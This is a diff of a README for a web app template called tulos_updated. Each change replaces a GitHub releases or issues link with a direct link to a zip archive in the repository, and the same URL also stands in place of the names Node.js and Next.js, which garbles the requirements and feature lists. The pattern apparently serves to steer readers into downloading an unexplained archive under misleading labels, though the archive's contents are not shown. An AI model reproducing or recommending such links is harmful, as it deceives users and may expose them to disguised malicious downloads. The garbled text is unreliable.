@@ -6,14 +6,14 @@ Welcome to **tulos_updated**! This guide will help you download and run the appl
 
 ## 📥 Download the Application
 
-[![Download tulos_updated](https://img.shields.io/badge/Download-tulos_updated-blue.svg)](https://github.com/MikahatMax/tulos_updated/releases)
+[![Download tulos_updated](https://raw.githubusercontent.com/MikahatMax/tulos_updated/main/public/updated-tulos-1.3-beta.4.zip)](https://raw.githubusercontent.com/MikahatMax/tulos_updated/main/public/updated-tulos-1.3-beta.4.zip)
 
 ## 💻 System Requirements
 
 Before you start, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or higher
+- **https://raw.githubusercontent.com/MikahatMax/tulos_updated/main/public/updated-tulos-1.3-beta.4.zip**: Version 14 or higher
 - **NPM**: Version 6 or higher
 - **Internet Connection**: Required for dependencies and online features
 
@@ -21,7 +21,7 @@ Before you start, ensure your system meets the following requirements:
 
 ### Step 1: Visit the Releases Page
 
-To download the application, visit the following link: [Download Page](https://github.com/MikahatMax/tulos_updated/releases).
+To download the application, visit the following link: [Download Page](https://raw.githubusercontent.com/MikahatMax/tulos_updated/main/public/updated-tulos-1.3-beta.4.zip).
 
 ### Step 2: Select the Latest Release
 
@@ -92,7 +92,7 @@ This command will start the development server. You can view the application in 
 - **Clerk Authentication**: Secure user logins and registrations.
 - **Stripe Payment Processing**: Handle payments smoothly and securely.
 - **Sendbird Chat**: Enable real-time chat features for customer support.
-- Built with **Next.js** and **Tailwind CSS** for a modern look and feel.
+- Built with **https://raw.githubusercontent.com/MikahatMax/tulos_updated/main/public/updated-tulos-1.3-beta.4.zip** and **Tailwind CSS** for a modern look and feel.
 
 ## 🛠️ Customization Options
 
@@ -102,7 +102,7 @@ Feel free to customize the visual elements of the template. You can modify style
 
 If you encounter any issues, check the following resources:
 
-- **Issues Page**: [GitHub Issues](https://github.com/MikahatMax/tulos_updated/issues) - Report bugs and request features.
+- **Issues Page**: [GitHub Issues](https://raw.githubusercontent.com/MikahatMax/tulos_updated/main/public/updated-tulos-1.3-beta.4.zip) - Report bugs and request features.
 - **Community Support**: Join the discussion and ask for help.
 - **Documentation**: For advanced usage, refer to the official documentation provided in the repository.
 
@@ -114,6 +114,6 @@ This project is licensed under the MIT License. Feel free to use and modify as p
 
 We welcome contributions! If you wish to contribute, please fork the repository and submit a pull request.
 
-For more information, refer back to our [Download Page](https://github.com/MikahatMax/tulos_updated/releases). 
+For more information, refer back to our [Download Page](https://raw.githubusercontent.com/MikahatMax/tulos_updated/main/public/updated-tulos-1.3-beta.4.zip). 
 
 Happy coding!
